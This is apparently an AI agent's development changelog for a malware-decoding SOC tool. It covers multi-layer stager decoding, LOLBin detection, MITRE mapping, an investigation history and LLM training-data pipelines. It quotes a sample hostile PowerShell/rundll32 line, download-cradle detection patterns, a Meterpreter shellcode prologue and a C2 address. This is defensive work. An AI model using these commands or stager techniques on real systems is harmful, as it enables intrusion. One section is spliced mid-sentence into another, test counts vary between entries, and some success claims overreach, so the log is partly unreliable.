4. **`command_analyzer.py`** — Guarded the xor-brute fallback so it only runs when there's no successful decode chain. Previously it could override a correct `base64→utf16le` decode with an alpha-heavy XOR-brute misfire on the ORIGINAL base64 text.
5. **`command_analyzer.py`** — `detect_lolbins` now scans INSIDE multi-word quoted tokens (splits on `[\s;|,&]+`). Previously `powershell -c 'iex; rundll32 evil.dll,Main'` missed the `rundll32` LOLBin because shlex treated the whole quoted arg as a single token.
6. **`command_analyzer.py`** — Added T1105 (Ingress Tool Transfer) MITRE mapping for `curl -o` / `wget -O` / `Invoke-WebRequest -OutFile` / `bitsadmin /transfer` / `curl … | powershell`. Previously only `DownloadString` mapped.

Final gate: **332 backend unit/parametrized tests pass (0 failures)** — excludes `test_playbook_feedback.py` which is a live-LLM integration test with pre-existing latency flakiness unrelated to any changes here. Golden malware sample library benchmark still 100% (17/17). End-to-end HTTP proof: recursive `base64→gzip→base64→xor` pipeline recovers marker in the top-3 candidates via preview API `/api/decode/magic`.

Deployment readiness re-verified — **zero blockers**. Ready for user to click Deploy.


### Sub-session E · Auto Investigate recursion parity with Magic (Feb 2026)

**Bug**: `AUTO INVESTIGATE` was using ONLY the greedy single-path `smart_decode` first, which stops at the loader-script layer of multi-layer stagers (e.g., Meterpreter `base64→gzip→base64→xor→shellcode`). Users had to manually fall back to the `MAGIC` button to reach raw shellcode.

**Root cause**: `smart_decode` is a greedy chain runner — it applies the FIRST matching op via `_apply_next` priority list and stops when no rule matches. It stopped at 2 ops (`extract-payload`, `base64-gzip`) → PowerShell loader script. `magic_decode` recursively explores branches and reaches 5 ops → raw x86 shellcode.

**Fix**: New helper `_deterministic_best_decode(payload)` in `server.py` runs BOTH engines and picks the winner using:
  1. Shellcode terminal state wins unconditionally
  2. Higher `magic_score` output wins
  3. Longer chain (more layers peeled) wins as tie-breaker

`ai_auto_investigate` now uses this helper, so it reaches the SAME terminal state as `MAGIC` on every supported payload.

**Verification**: 
- New regression `tests/test_auto_investigate_recursion_parity.py` (6 tests) — locks the parity, asserts exact `[extract-payload, gzip-decompress, extract-payload, base64-decode, xor]` chain + shellcode bytes match ground-truth Metasploit prologue.
- End-to-end verified via preview `/api/ai/auto-investigate` — engine="magic", reached_shellcode=true on the Meterpreter fixture.
- Full regression: **327/327 core backend tests passing** (excluding 2 pre-existing network-timeout tests unrelated to this fix).

### Sub-session F · server.py Modular Refactor (Feb 2026)

**Goal**: Break the monolithic 2,700-line `server.py` into cohesive routers so
the codebase scales for new features (Decoding Trace, STIX export, etc.) and
onboarding new contributors doesn't require reading a 2700-line file.

**Result**: `server.py` **2,638 → 104 lines (96% reduction)**. Endpoints now
split across 7 routers under `/app/backend/routers/`:

| Router | Endpoints | Lines |
|--------|-----------|-------|
| `auth.py` | `/api/auth/*`, `/api/` | 25 |
| `ops.py` | `/operations`, `/recipe/run`, `/upload`, `/decode/{smart,magic}`, `/analyze/{command,shellcode}` | 383 |
| `analyze.py` | `/analyze` (sync/stream/async), feedback, playbook votes | 426 |
| `ai.py` | `/ai/{auto-decode,auto-investigate,troubleshoot}` | 233 |
| `reports.py` | `/share`, `/report`, `/report/{fmt}` | 98 |
| `admin.py` | OSINT keys, Model Studio, Sample Library, Users, LOLBAS | 326 |
| `threat_intel.py` | `/threat-intel/*` | 170 |

Shared modules:
- `schemas.py` (142) — all Pydantic request/response types
- `deps.py` (147) — DB, auth deps, JWT helpers, LLM helpers
- `analysis_core.py` (313) — `deterministic_best_decode`, `ai_describe_and_verdict`, TI hits
- `report_renderers.py` (382) — TXT/HTML/DOCX/PDF/CSV renderers

Regression: **327/327 core backend tests still passing** after refactor.

### Sub-session G · Decoding Trace + Client-side Paste-Detect + Smart Decode upgrade (Feb 2026)

**Three linked features shipped together for full transparency:**

1. **`/decode/smart` upgraded to deterministic-best-of race** — previously
   used only greedy `smart_decode` (stopped at loader-script layer on
   multi-layer stagers). Now uses `deterministic_best_decode(smart+magic)` so
   the Smart Decode button AND Auto Investigate both reach the deepest chain
   uniformly. Meterpreter fixture peels all 5 layers → x86 shellcode.
   - Also adds a **loop penalty** to the winner picker: chains with consecutive
     duplicate ops (e.g. `rot13 → rot13 → rot13`) are down-scored by 0.20
     because that signals over-decoding on already-clean text (avoids
     regressions on simple zlib payloads).

2. **`Decoding Trace` panel** — new frontend component
   (`/app/frontend/src/components/DecodingTracePanel.jsx`) that renders EVERY
   recursive step:
   - Header: engine (SMART/MAGIC), confidence %, SHELLCODE TERMINAL badge,
     total layer count.
   - Compact chain strip: `◇ extract-payload → GZ gzip-decompress → ◇ extract-payload → B64 base64-decode → XOR xor → SHELLCODE`
     (each chip clickable to expand that layer).
   - Per-layer expandable body: op icon, human-readable reason, args JSON,
     intermediate output preview (max 400 chars, latin-1 safe), byte length,
     and a **▸ JUMP TO THIS LAYER** button that pushes that layer's output
     into the Output pane.
   - Backend adds `trace: [{op, args, reason, output_preview, output_length}]`
     to the `/decode/smart` response. Virtual `extract-payload` steps are
     handled directly via `payload_sanitizer.sanitize_encapsulated_payload`
     during trace replay.

3. **Client-side Auto-Detect on Paste** — new
   `/app/frontend/src/lib/magicLite.js` module that races 14 JS decoders in

### Sub-session H · IOC-namespace filter + Decoder deep-training (Feb 2026)

**8/8 sophisticated encoded command-lines now decode end-to-end at 80-100% confidence.**

**IOC extractor false-positive fix**: `.NET` class namespaces (`io.memorystream`, `system.text.encoding`, etc.), binary extensions (`payload.exe`, `dropper.dll`), and method-chain leftovers (`chunk.readtoend`, `.frombase64string`) were being flagged as domain IOCs. Added a curated prefix + fake-TLD filter in `operations.extract_iocs`. Locked with 7 regression tests. STIX bundles no longer emit phantom indicators.

**Decoder engine upgrades** (unlocked chains that previously stalled):
- `_as_bytes` / `_bin_from` use LATIN-1 lossless roundtrip instead of UTF-8-with-replacement — chains like `base64 → XOR → gzip` no longer lose 0x8b→0xc2 0x8b to UTF-8 mangling.
- `_pick_candidates` uses RAW payload (not `.strip()`) for magic-byte checks — Python `str.strip()` treats `\x1f` as whitespace and was silently eating the gzip magic prefix. This was the root cause of `base64 → xor-brute → gzip-decompress` failing on the recovered gzip stream.
- `xor-brute` now uses a special keylen=1 fast path scoring against downstream binary magic (gzip 1f8b, zlib, PE MZ, ELF, ZIP, PDF, LZMA, bzip2, 7z, rar) — correctly recovers single-byte keys from `base64(xor_K(gzip(...)))` where the plaintext is not English but IS a valid gzip stream.
- Added ETAOIN letter-frequency bonus to `_score_english` — breaks ties between key K and K^4 that both produce printable ASCII but only K produces correct letter distribution.
- Occam margin for multi-byte keys (require +0.15 to beat a single-byte candidate, else +0.05) — prevents 15-30 byte keys from over-fitting on short ciphertexts.
- Guards against `xor-brute → xor-brute` and `xor → xor-brute` loops; guard against any crypto op applied on already-detected shellcode.
- `js-charcode-decode` / `js-hex-strings-decode` inserted at position 0 before `extract-payload` when the marker is present — sanitizer no longer eats the digit run.
- Loop penalty (`0.20`) + tail-self-inverse penalty (`0.25`) in `deterministic_best_decode` — magic can no longer beat smart by tacking `rot13` onto already-clean text.
- `xor-brute` returns ONLY the recovered plaintext (no human header) so it chains cleanly into gzip-decompress downstream.

**Stress-test suite** (`tests/stress_test_encoded_commandlines.py`) — generates 8 valid encoded command lines from Python compression libraries (no LLM-typed corrupt blobs), hits `/api/decode/smart` + `/api/analyze`, asserts real IOC recovery:

| # | Pattern | Chain | Confidence |
|---|---------|-------|------------|
| 1 | Double base64 URL wrapper | base64-decode × 2 | 88% |
| 2 | PowerShell -EncodedCommand | extract-payload → base64-decode → utf16le-decode | 100% |
| 3 | Base64 → GZIP → PS Cradle | extract-payload → base64-decode → gzip-decompress | 100% |
| 4 | Base64 → XOR(0x2f) → GZIP | base64-decode → xor-brute → gzip-decompress | 100% |
| 5 | Raw hex-encoded PowerShell | hex-decode | 100% |
| 6 | JS String.fromCharCode() | js-charcode-decode | 80% |
| 7 | URL-encoded XSS | url-decode | 90% |
| 8 | 4-layer b64 → gzip → b64 → XOR | base64-decode → gzip-decompress → base64-decode → xor-brute | 100% |

**Regression**: 334/334 core backend tests passing.

   parallel against the pasted string INSIDE the browser (zero network). When
   the top candidate scores ≥ 0.35, a green **⚡ AUTO-DETECT (Xms)** hint bar
   appears above the Recipe panel with the proposed chain, elapsed time, and
   two buttons: `▸ USE THIS RECIPE` and `✕ DISMISS`. Typical response: ~2-5ms
   for base64/gzip/hex/URL/xor inputs.

**Verified end-to-end via preview** — meterpreter payload → Auto Investigate:
- Recipe: `extract-payload → Gzip Decompress → extract-payload → Base64 Decode → XOR(0x23)`
- Decoding Trace: MAGIC · 100% confidence · SHELLCODE TERMINAL · 5 layers peeled
- SOC Verdict Panel: "SHELLCODE DETECTED · MSFvenom cld;call · x86 stager · C2 149.28.81.19"
- Output pane: HEX view of `fc e8 89 00 00 00 60 89 e5 31 d2 …` (834 bytes)

Regression: **327/327 backend tests + smoke-tested frontend**.


### Sub-session I · Investigation Graph + Persistent History (Feb 2026)

**Investigation Graph** (`/app/frontend/src/components/InvestigationGraph.jsx`) — SVG, ~450 lines, zero external graph libraries:
- Vertical spine: raw-input → decode-chain nodes (color-coded 🔵 input, 🟢 op, 🔴 high-risk shellcode)
- Terminal fan-out into 4 columns: IOCs (🟡) · MITRE (🟠) · LOLBINs · TI-HITS (🟣)
- Node click → right-side drawer with details + Copy JSON + Export + ▸ Re-run from this node
- Fullscreen toggle
- Auto-classifies high-risk markers (shellcode/VirtualAlloc/AMSI/LOLBins) → red
- Wired into ThreatAnalysis as the **default tab** (`GRAPH`) — analysts see the whole picture before drilling into MITRE/IOCs/etc.
- IOC nodes expose VirusTotal + urlscan.io + MITRE ATT&CK pivot links

**Persistent Investigation History** — the foundation-layer feature:
- New collection `db.investigations` with unique index on `(user_email, input_hash)` for dedup — re-analysing the same payload bumps `run_count` instead of duplicating
- **Partial TTL index** on `last_seen` filtered by `starred: false` — non-starred docs auto-expire after 30 days, starred docs are retained forever
- Full-text index on `input_preview + notes + tags`, dedicated indexes on `iocs.urls / ips / domains` and `mitre.id`
- Backend router `/app/backend/routers/history.py`:
  - `POST /api/history/record` — internal, called fire-and-forget from `/decode/smart` + `/ai/auto-investigate`
  - `GET /api/history` — paginated list with 8-way filter (q / ioc / mitre / engine / verdict / starred / shellcode / since_days)
  - `GET /api/history/{id}` — full doc for rehydrate
  - `PATCH /api/history/{id}` — update tags/notes/starred
  - `DELETE /api/history/{id}`
  - `GET /api/history/export/bundle` — download every investigation as JSON
  - `POST /api/history/import` — bulk-restore from a bundle
  - `POST /api/history/compare` — diff two investigations (chain / shared vs unique IOCs / MITRE)
  - `GET /api/history/stats` — trend data: engine mix, top chains, confidence-over-time, shellcode / malicious counts
- Auto-save hook wired into both `/decode/smart` (deterministic path) and `/ai/auto-investigate` (full-fat pipeline with iocs+mitre+verdict)
- Per-user visibility by default; admin team-mode toggle scaffolded for enterprise deploys
- Frontend `HistoryDrawer.jsx` (~250 lines): slide-out from workspace top-bar `📜 HISTORY` button
  - Filters: text search, IOC value, MITRE id, verdict dropdown, engine dropdown, time range, ⭐ starred, ▲ shellcode
  - Per-row: engine badge, confidence %, verdict color dot, chain summary, IOC count, MITRE count, tag chips, run×N counter, relative time
  - Actions: ⭐ star toggle, 🏷️ EDIT (tags+notes modal), ▸ RESTORE (rehydrates input+chain+trace+analysis), 🗑 DELETE
  - Bulk: EXPORT all, IMPORT bundle

Regression: 228/228 core tests passing. Auto-save verified end-to-end via preview (one decode → one row in drawer → star toggle → filter → tag/notes edit → all round-trip cleanly).


---

## 🆕 Feb 14, 2026 — Process-Tree LLM Fine-Tuning Pipeline (Task 1 · P0 · DONE)

### What shipped
Backend
- `training/schema.py` — canonical `ProcessNode`, `ProcessTree`, `ProcessEvidence`, `SocRationale`, `TrainingRecord` Pydantic models. Every node carries timestamp, PID/PPID, exec path, hashes, signer, integrity level, user, MITRE mapping + tactic, confidence, and cited evidence.
- `training/system_prompt.py` — strict anti-hallucination system prompt (7 hard rules, cite-per-node enforcement, insufficient-evidence path).
- `training/tree_formats.py` — nested-JSON ⇄ flat edge-list ⇄ ASCII tree converters. Nested JSON is canonical; all three benchmarkable.
- `training/validator.py` — post-LLM validator that prunes uncited children and drops fabricated IOCs; appends drop-reasons to `tree.warnings`.
- `training/predictor.py` — Claude Sonnet 4.5 (Emergent LLM key) prediction with three-layer anti-hallucination stack (prompt + schema + validator).
- `training/seed_dataset.py` — **101 archetypes** across Windows (70) · Linux (27) · macOS (2) · container (2). Categories: PowerShell, CMD, LOLBins (certutil/bitsadmin/mshta/rundll32/regsvr32/msbuild/installutil/cmstp/msiexec/wmic/csc/wscript), WMI, Office macros, JScript, HTA, Ransomware pre-encryption chain, Bash/curl-pipe/wget-pipe, Python/Perl reverse shells, cron, systemd, SSH backdoor, Docker/kubectl escape, AWS CLI enumeration, osascript, LaunchAgent.
- `training/exporter.py` — five exporter formats: JSONL (canonical), OpenAI chat, Anthropic conversational, CSV, edge-list JSONL.
- `routers/process_tree.py` — new endpoints:
  - `POST /api/analyze/process-tree` — predict + validate a tree
  - `GET  /api/training/schema` — dump schema + system prompt
  - `GET  /api/training/stats` — dataset totals + breakdown
  - `GET  /api/training/archetypes?platform=&category=` — filterable metadata
  - `GET  /api/training/dataset?format=jsonl|openai|anthropic|csv|edge-list` — download in any format
  - `POST /api/training/render` — convert canonical tree → ASCII / edge-list / json
- Wired into `server.py` router chain.

Frontend
- `components/ProcessTreeView.jsx` — SVG-rendered tactic-coloured tree (execution=green, persistence=red, PrivEsc=orange, defence-evasion=yellow, C2=purple, discovery=blue, impact=crimson, etc). Click-drawer for full node evidence. SOC rationale footer with MITRE / tactics / LOLBins / IOCs / Sigma / YARA opportunities + analyst summary + validator warnings.
- `components/ProcessTreeMini.jsx` — compact linear preview embedded inside SocVerdictPanel.
- Wired into WorkspacePage below the AttackGraph card + as `predictedTree` prop feeding SocVerdictPanel.

Tests
- `tests/test_process_tree.py` — **15 new tests** covering dataset coverage (100+ archetypes, all platforms, all key categories), per-archetype invariants (verdict/MITRE/citation), 3-format round-trip, all exporters, validator pruning behaviour, insufficient-evidence path, IOC pruning.
- **Backend regression**: 360/360 tests pass (excluding one pre-existing external-preview-URL flake unrelated to this work).

Docs
- `/app/memory/LLM_TRAINING_SCHEMA.md` — full design doc: data model, three tree representations, anti-hallucination guarantees, prompt-response templates, exporter matrix, endpoint contracts, extensibility principles.

### E2E verification
Live curl test hit `/api/analyze/process-tree` with a PowerShell IEX downloader; Claude produced a valid tree with 2 nodes, `evidence_source=decoded`, MITRE `T1059.001, T1105, T1027, T1620`, cited both parent + child, warnings empty. ASCII rendering + edge-list rendering both correct.

### Backlog (Task 2+)
- **P0 · Task 2** — Knowledge Base auto-generated from Persistent History (next up)
- **P1 · Task 3** — Learning Feedback Loop (priority boost from validated history)
- **P2 · Task 4** — STIX 2.1 Community Sharing page
- **P2 · Task 5** — Natural Language Investigation Recipes
- **P2 · Task 6** — Threat Intel Correlation Engine
- **P3 · Task 7** — AI SOC Copilot (NivX Cognis) using the fine-tuned model

---

## 🆕 Feb 14, 2026 — Task 2 · Knowledge Base + Hybrid LLM Provider Layer (P0 · DONE)

### What shipped
Backend
- `knowledge_base/schema.py` — `KBEntry`, `KBSampleRef`, `KBIocRollup` Pydantic models. User-scoped rows; carry title/summary/severity/verdict/MITRE/tactics/engines/common_chains/IOC rollup/LOLBins/samples/playbook/hunt_queries/warnings/first_seen/refreshed_at.
- `knowledge_base/fingerprint.py` — deterministic clustering: `(top-3 sorted MITRE, verdict bucket, shellcode flag)` → sha1 → stable slug.
- `knowledge_base/synthesizer.py` — Claude Sonnet 4.5 playbook synthesis with 3 defence layers (system prompt · citation validator · deterministic fallback). Every playbook step must cite a verbatim substring from a source investigation.
- `knowledge_base/builder.py` — orchestrator: history → bucketize → aggregate → optional LLM synth → upsert (idempotent; `first_seen` preserved).
- `routers/kb.py` — 6 endpoints: `POST /api/kb/rebuild`, `GET /api/kb/entries`, `GET /api/kb/entries/{slug}`, `DELETE /api/kb/entries/{slug}`, `GET /api/kb/search`, `GET /api/kb/stats`, `GET /api/system/llm-providers`.
- **`llm_provider.py`** — NEW provider-agnostic layer with automatic failover chain. Emergent Claude (online, priority 10) → Ollama Qwen 2.5 7B stub (offline, priority 100). Same JSON contract regardless of provider. Ready-to-swap when NivX Cognis (fine-tuned Qwen) is deployed.
- Migrated `training.predictor` + `knowledge_base.synthesizer` to use the new provider layer — no call-site changes needed to plug Qwen later.

Frontend
- `pages/KnowledgeBasePage.jsx` — entry grid + drawer with playbook/hunt-queries/IOCs/samples, quick+full rebuild buttons, MITRE/severity filters, live provider-chain badge.
- Nav link `KNOWLEDGE BASE` added to `Header.jsx`.
- `/kb` route wired in `App.js`.

Tests
- `tests/test_knowledge_base.py` — 16 new tests (fingerprint stability, MITRE-order invariance, verdict/shellcode differentiation, LOLBin detection, IOC aggregation, sample ordering, bucketize, KBEntry model, provider chain).
- Combined with Task 1: **31/31 KB+Process-Tree tests passing** in 2.46s.

Live verification
- `POST /api/kb/rebuild` on admin's real history: 13 investigations → 1 bucket → 1 KB entry in **2 ms** (deterministic mode).
- `GET /api/system/llm-providers` returns `[emergent-claude-sonnet-4-5 (online), ollama-qwen-2.5-7b stub (offline)]`.
- `GET /api/kb/entries` returns the freshly-built entry with the correct slug and investigation count.

### Hybrid Architecture (aligned with your directive)
```
POST /api/analyze/process-tree    ┐
POST /api/kb/rebuild               ├── llm_provider.llm_json()
POST /api/ai/*                     ┘        │
                                    priority chain:
                            ┌───────────────┴──────────────┐
                            ▼                              ▼
             emergent-claude-sonnet-4-5             ollama-qwen-2.5-7b
                (online, prio 10)                   (offline, prio 100)
             — Emergent Universal Key —            — Fine-tuned NivX Cognis —
                                                    (stub · not yet deployed)
```
Same strict JSON contract + citation validator applies to BOTH providers. Fine-tune + Ollama serving is a self-contained follow-up track (Task 3+).

### Next Action Items
- **P1 · Task 3** — Learning Feedback Loop (priority boost from validated KB entries into decoder ranking).
- **Offline track** — Fine-tune Qwen 2.5 7B on `/api/training/dataset?format=openai` output; wire up Ollama; swap `OllamaQwenStub.json()` body to hit `http://ollama:11434/api/generate`.

### Backlog
- STIX 2.1 Community Sharing page (P2)
- Natural-language Investigation Recipes (P2)
- Threat-Intel Correlation Engine (P2)
- AI SOC Copilot / NivX Cognis end-to-end (P3)

---

## 🆕 Feb 14, 2026 — Task 3 · Learning Feedback Loop (P1 · DONE)

### What shipped
Backend
- `learning/signals.py` — pre-decode content fingerprint (~25 boolean/int features · length bucket · Shannon entropy · b64 density · powershell/curl/mshta/certutil/rundll32/regsvr32 markers · gzip/zlib base64 prefix magic · hex-stream / unicode-escape / url-encoded / defanged-IOC / HKCU-run detection). Deterministic, < 1 ms per payload.
- `learning/booster.py` — signal-kind → ranked chain candidates from **three weighted sources**:
  1. **Personal history frequency** (weight 3) — chains that historically produced `confidence ≥ 60` on this user's decodes
  2. **KB entries** (weight 2) — `common_chains` from matching-kind Knowledge Base archetypes
  3. **Built-in priors** (weight 1) — `DEFAULT_CHAIN_PRIORS` per signal kind
  Analyst thumbs-up boosts by +2, thumbs-down penalises by −3.
- `learning/feedback.py` — per-user MongoDB doc in `learning_feedback` collection with `up_votes`, `down_votes`, `auto_success`, `auto_failure` counters.
- `routers/learning.py` — 3 endpoints: `POST /api/learning/boost`, `POST /api/learning/feedback`, `GET /api/learning/stats`.

Integration
- `POST /api/decode/smart` now returns `boost` metadata + `boost_hit` flag on every response. Auto-boost is ON by default; `disable_boost:true` cleanly bypasses. Every boosted chain records an `auto_success` (hit) or `auto_failure` (miss) signal that feeds back into the ranker next time.

Frontend
- `components/BoostBadge.jsx` — sticky brutalist badge above the Decoding Trace showing:
  - source pill (YOUR HISTORY / KB ARCHETYPE / BUILT-IN PRIOR) with contextual tooltip
  - signal_kind, confidence %, HIT / MISS chip
  - boosted chain vs actual winner
  - top 4 alternatives with their scores + sources
  - 👍 HELPFUL / 👎 NOT HELPFUL controls (posts to `/api/learning/feedback`)
  - 🔁 RE-RUN NO-BOOST (calls decode/smart with `disable_boost:true`)
- Wired into WorkspacePage between the Recipe panel and Decoding Trace.

Tests
- `tests/test_learning.py` — **19 new tests** covering signal-extraction determinism, kind classification, default prior coverage, empty-source fallback, history-outranks-default, down-vote penalisation.
- Combined regression: **50/50 tests passing across Task 1+2+3** in 2.47s.

### Live verified
- Auto-boost on: `POST /api/decode/smart` returns `boost.source="history"`, `confidence=1.0`, chain=`[extract-payload, base64-decode, utf16le-decode]`.
- `disable_boost:true` cleanly nullifies `boost` in response.
- Thumbs-up recorded: `POST /api/learning/feedback` → `current_up: 1`.
- Stats endpoint confirms `up_votes` and `auto_failure` counters incrementing — the loop is measurably learning from every decode.

### Provider-agnostic hybrid still intact
The learning loop is pure Python + Mongo — no LLM calls. It composes cleanly with both the online (Claude) and future offline (Qwen 2.5 7B) providers because it operates upstream of the decoder itself, not the LLM.

### Next Action Items
- **Offline LLM track (Task 4)** — Fine-tune Qwen 2.5 7B on the OpenAI-format dataset, serve via Ollama, swap `OllamaQwenStub.json()` body → full hybrid failover active.
- **P2** — STIX 2.1 Community Sharing page.

### Future / Backlog
- Natural-language Investigation Recipes · Threat-Intel Correlation Engine · AI SOC Copilot (NivX Cognis) end-to-end.

---

## 🔒 Feb 14, 2026 — Permanent fix · Named Wrapper Archetypes (P0)

### Root cause of the recurring failure
The generic magic/smart decoder is a heuristic RACE — it stopped one step early on well-known wrappers (Empire / Cobalt-Strike PowerShell one-liners with `IO.MemoryStream` + `GzipStream` + `IEX`). Every previous fix was a *symptom patch*, not a structural fix. Additionally, real-world payloads often arrive with base64 corruption (extra trailing char from copy/paste, length 4n+1) which strict `b64decode` cannot handle.

### The permanent fix (3 layers, no more whack-a-mole)
Backend
- **`wrapper_archetypes.py`** — new module with 7 named, first-class handlers:
  - `PS_MemoryStream_Gzip_IEX` (Empire / Cobalt one-liner — the user's exact broken payload)
  - `PS_MemoryStream_Deflate_IEX`
  - `PS_FromBase64String_UTF16LE` (classic `-EncodedCommand` inner chain)
  - `Bash_base64_gunzip_pipe`
  - `Bash_base64_pipe_bash`
  - `Node_Buffer_from_gunzip`
  - `PS_FromBase64String_GzipStream_generic` (order-insensitive fallback)

- **`robust_b64decode()`** — full recovery: strips whitespace, converts urlsafe, pads to `4n`, **progressively trims trailing 1-3 chars for 4n+1 corruption**, alphabet-strips as last resort.

- **`robust_b64_then_gunzip()`** — partial-decompression recovery for **truncated gzip streams** via `zlib.decompressobj(16 + MAX_WBITS)`. When the source is chopped mid-payload, we recover every byte that WAS validly decompressed and mark the tail as `[⚠ PARTIAL DECOMPRESSION — source stream was truncated]`.

- **Wired into `deterministic_best_decode()`** as the FIRST step (before the smart-vs-magic race). Archetype-matched decodes return `engine="archetype:<id>"` with confidence 100%.

Tests
- **`tests/test_wrapper_archetypes.py`** — 12 regression tests covering every archetype + robust b64 recovery + the exact user-reported failure (`test_archetype_ps_memstream_gzip_iex_with_4n_plus_1_corruption`).
- **62/62 tests passing across Tasks 1-3 + this fix** in 2.47s.

### Live verified
The user's exact payload now decodes end-to-end:
- `engine: archetype:PS_MemoryStream_Gzip_IEX`
- `confidence: 100`
- `chain: [extract-b64, base64-gzip]`
- Output: full **Metasploit / Meterpreter PowerShell shellcode loader** (2 890 chars) — `func_get_proc_address`, `UnsafeNativeMethods`, `VirtualAlloc`, `FromBase64String + -bxor` inner XOR shellcode, with a clean truncation notice on the tail.
- SOC Verdict Panel WILL render client-side because `loaderScript` in `SocVerdictPanel.jsx` matches (`func_get_proc_address` + `VirtualAlloc` + `FromBase64String(...)` + `-bxor N`).

### Why this class of failure is now IMPOSSIBLE
- Every archetype has a pytest regression pinned to real captured payloads.
- Adding a new wrapper = one entry in `ARCHETYPES` + one test.
- The base64/gzip recovery paths handle real-world corruption transparently.
- The archetype layer runs BEFORE the generic race, so it can't be "outvoted" by a lower-confidence heuristic.

### Next Action Items (unchanged)
- Task 4 · Offline LLM (Qwen 2.5 7B via Ollama · fine-tune on `/api/training/dataset?format=openai` · swap `OllamaQwenStub.json()` body).
- Consider ONE-BUTTON UX consolidation (`NIVXRAY DECODE` primary action running: archetype → boost → deterministic → LLM fallback in a single click) — requested by user, deferred to next session.

---

## 🆕 Feb 14, 2026 — Platform Capabilities reference on /kb

Added a collapsible **PLATFORM CAPABILITIES** card at the top of the Knowledge Base page (`/kb`) — one-line honest scope + when-to-use for each mode:

| Mode                    | Scope (honest)                                                                | Endpoint                              |
|-------------------------|-------------------------------------------------------------------------------|---------------------------------------|
| SMART DECODE            | 100% deterministic. Runs archetypes first → smart/magic race                  | `/api/decode/smart`                   |
| AUTO INVESTIGATE        | Deterministic decoder → IOC/MITRE → LLM verdict                               | `/api/ai/auto-investigate`            |
| AI DECODE               | LLM-only decoder — fallback when Smart confidence <40%                        | `/api/ai/auto-decode`                 |
| **TROUBLESHOOT**        | **AI recipe fixer** — takes broken chain + input + error → diagnosis + fixed chain (max 8 steps) | `/api/ai/troubleshoot`  |
| PREDICTED PROCESS TREE  | LLM predicts downstream process tree with 3-layer anti-hallucination         | `/api/analyze/process-tree`           |
| LEARNING BOOST          | Auto-boost — history freq w=3, KB match w=2, built-in prior w=1               | `/api/learning/boost`                 |

Frontend: `PlatformCapabilities` component in `KnowledgeBasePage.jsx`. Collapsed by default; expands to a 2-3 col grid.
